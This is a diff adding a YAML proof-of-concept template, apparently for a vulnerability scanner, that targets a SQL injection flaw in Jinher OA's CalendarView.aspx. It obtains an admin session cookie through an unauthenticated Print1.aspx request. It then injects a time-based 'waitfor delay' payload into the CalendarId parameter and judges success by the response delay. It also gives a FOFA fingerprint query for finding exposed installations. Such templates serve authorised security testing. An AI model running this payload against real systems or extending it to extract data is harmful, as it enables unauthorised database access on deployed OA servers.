@@ -1,0 +1,35 @@
+id: poc-yaml-jinher-jhsoft-calendarview-aspx-sqli
+info:
+  name: 金和OA CalendarView.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.calendar/public/Print1.aspx/?UserCode=admin
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"ASP.NET_SessionId=(?P<cookie>.*?);")
+- method: GET
+  path: /c6/Jhsoft.Web.Calendar/CalendarView.aspx?CalendarId=1'waitfor+delay%270:0:{{.t1}}%27--
+  headers:
+    Cookie: ASP.NET_SessionId={{.cookie}}
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"日程查看") &&
+
+    contains(gbk_decode(body),"打印") &&
+
+    contains(gbk_decode(body),"导出") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
